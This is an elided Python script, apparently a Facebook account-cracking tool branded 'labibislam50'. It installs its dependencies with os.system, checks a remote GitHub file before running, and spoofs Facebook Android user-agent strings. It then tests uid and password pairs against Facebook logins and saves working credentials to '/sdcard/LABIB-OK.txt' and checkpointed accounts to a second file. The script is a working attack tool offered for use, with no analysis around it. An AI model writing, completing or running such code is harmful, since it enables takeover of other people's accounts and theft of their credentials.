...
try:
    ...
    print('\n \033[1;91m[\033[1;93mlabibislam50\033[1;91m]\033[1;97m installing requests !...\n')
    time.sleep(0.5)
...
try:
    ...
    print('\n \033[1;91m[\033[1;93mlabibislam50\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mlabibislam50\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
...
try:
    ...
    if "Bangladesh" not in ___ccc___:
       os.system('xdg-open https://github.com/labibislam50')
...
try:
    os.system('clear')
    srv=requests.get('https://raw.githubusercontent.com/labibislam50I/SPIDER/main/srv.txt').text 
    if "update" in srv:
        os.system('clear')
        for j in range(3000):
            time.sleep(0.5)
...
os.system('xdg-open https://www.facebook.com/profile.php?id=100078790456309')
def logo():
    os.system('clear')
    print(f"""                    ██▓    ▄▄▄       ▄▄▄▄    ██▓ ▄▄▄▄   
▓██▒   ▒████▄    ▓█████▄ ▓██▒▓█████▄ 
           ...
           # ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2076};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            ...
            if 'session_key' in q:
                ...
                if 'Photoshop' in res:
                    ...
                    open('/sdcard/LABIB-OK.txt','a').write(uid+'|'+pas+'\n')
                    oks.append(ids)
                    break
                else:pass
            elif 'www.facebook.com' in q['error_msg']:
                print(f'\r\r\x1b[38;5;208m[DIED] '+ids+' | '+pas+'\033[1;97m')
                open('/sdcard/LABIB-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
